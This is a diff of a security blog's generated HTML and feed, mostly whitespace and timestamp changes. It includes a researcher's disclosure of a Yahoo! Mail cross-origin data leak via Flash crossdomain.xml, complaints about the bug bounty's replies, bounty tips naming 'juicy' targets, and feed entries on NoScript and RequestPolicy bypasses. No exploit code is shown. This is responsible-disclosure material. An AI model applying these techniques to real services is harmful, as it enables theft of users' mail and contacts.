 <p>.swfs that actually need crossorigin access to YMail should be moved to the existing <code>mail.yimg.com</code> subdomain, and the <code>crossdomain.xml</code> should be tightened up to keep YMail safe from rogue galleries of Asian imports and pet shows.</p>
 
+
+
+
 <h2>About Yahoo!&rsquo;s Initial Response</h2>
+
+
+
 
 <p>The other thing I want to mention is the initial response I got. I initially submitted an overview of the issue and attached a proof-of-concept that put the JSON from the contacts endpoint in a textbox. Very rudimentary, but sufficient to show crossorigin data leakage. All I got in response was a form reply basically saying &ldquo;This is intended behaviour, wontfix&rdquo;. I replied asking why they thought that, and if they had any issues reproducing the issue, but didn&rsquo;t receive a reply.</p>
 
+
+
+
 <p>I know that reproing Flash issues can be a pain in the ass, and I realized the PoC would break if served from localhost, so I hosted a version with no setup required that more clearly showed what was leaked. I posted a link to the new PoC, reiterating what was being leaked. Still no response. It wasn&rsquo;t until I posted the version that leaked mail contents 8 months later that I got an unscripted reply.</p>
+
+
+
 
 <p>I get that Yahoo! probably receives tons of spurious reports every day, but without something actionable like &ldquo;I don&rsquo;t think X is a bug because Y&rdquo; or &ldquo;I&rsquo;m unable to reproduce the issue, Z happens instead&rdquo;, reporters don&rsquo;t have anything to go on if they&rsquo;re reporting a genuine issue. Without any feedback on what the issue is with the report, their only way to potentially get the bug fixed is through public disclosure (which an operator of a bug bounty probably doesn&rsquo;t want.) I also know this isn&rsquo;t an isolated case, since I recently saw a presentation where an RCE on Yahoo!&rsquo;s reverse proxies got the same treatment.</p>
 
+
+
+
 <p>To Yahoo&rsquo;s credit, the fellow who responded to my updated proof-of-concept was decently communicative, but every response I&rsquo;d ever received from Yahoo up &lsquo;til that point had been a scripted response of &ldquo;fixed&rdquo;, &ldquo;wontfix&rdquo;, &ldquo;confirmed&rdquo;, or &ldquo;new&rdquo;. When I work with a company (either as a consultant or just through one-off reports,) nothing impresses me more than engineers responding with additional details relevant to my reports, and nothing turns me off more than the company being difficult to communicate with, money or no.</p>
 
+
+
+
 <h2>Tips For Yahoo! Bug Bounty Participants</h2>
+
+
+
 
 <ul>
 <li>Until the <code>crossdomain.xml</code>s are fixed, .swfs and endpoints where the whole response body is controlled are extra-juicy targets</li>
@@ -693,7 +1499,12 @@
 </ul>
 
 
+
+
 <h2>Disclosure Timeline</h2>
+
+
+
 
 <ul>
 <li>2014-02-09: Reported issue to vendor with PoC showing contacts leakage</li>
@@ -709,7 +1520,12 @@
 </ul>
 
 
+
+
 <h2>Related Links</h2>
+
+
+
 
 <ul>
 <li><a href="https://hackerone.com/reports/1171">HackerOne report (private at time of posting)</a></li>
@@ -1334,7 +2150,7 @@ the same timing attack as <code>caretPositionFromPoint</code>.</p>
   <entry>
     <title type="html"><![CDATA[Abusing NoScript's Global Whitelist Rules to Reveal Trusted Sites (the Easy Way)]]></title>
     <link href="http://blog.saynotolinux.com/blog/2013/12/18/abusing-noscripts-global-whitelist-rules-to-reveal-trusted-sites-the-easy-way/"/>
-    <updated>2013-12-18T01:58:17-08:00</updated>
+    <updated>2013-12-18T03:58:17-08:00</updated>
     <id>http://blog.saynotolinux.com/blog/2013/12/18/abusing-noscripts-global-whitelist-rules-to-reveal-trusted-sites-the-easy-way</id>
     <content type="html"><![CDATA[<p>Here&rsquo;s one that&rsquo;s been <a href="http://www.w2spconf.com/2011/papers/jspriv.pdf">covered a bit before</a>: <a href="http://noscript.net/">NoScript</a> makes it easy for whitelisted sites to see what other sites are on the whitelist.</p>
 
@@ -1387,7 +2203,7 @@ the first page load. Refresh the page if it doesn&rsquo;t work the first time.</
   <entry>
     <title type="html"><![CDATA[Bypassing RequestPolicy's Whitelist Using the Jar: URI Scheme]]></title>
     <link href="http://blog.saynotolinux.com/blog/2013/11/29/bypassing-requestpolicys-whitelist-using-the-jar-uri-scheme/"/>
-    <updated>2013-11-29T01:11:39-08:00</updated>
+    <updated>2013-11-29T04:11:39-08:00</updated>
     <id>http://blog.saynotolinux.com/blog/2013/11/29/bypassing-requestpolicys-whitelist-using-the-jar-uri-scheme</id>
     <content type="html"><![CDATA[<p>Here&rsquo;s an interesting bug I found while looking at some cross-domain data-stealing issues.
 It&rsquo;s possible to bypass <a href="https://www.requestpolicy.com/about.html">RequestPolicy</a>&rsquo;s whitelist entirely by referencing a resource nested in a <a href="http://www.gnucitizen.org/blog/web-mayhem-firefoxs-jar-protocol-issues/">jar URI</a>:</p>
